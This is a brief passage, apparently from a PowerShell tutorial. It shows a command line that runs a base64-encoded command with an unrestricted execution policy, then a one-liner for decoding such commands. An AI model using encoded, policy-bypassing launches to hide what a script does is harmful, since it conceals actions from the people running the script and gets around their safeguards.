PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand $encoded
```

To decode a PowerShell encoded command, run the following PowerShell command:

```pwsh
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($command))
```
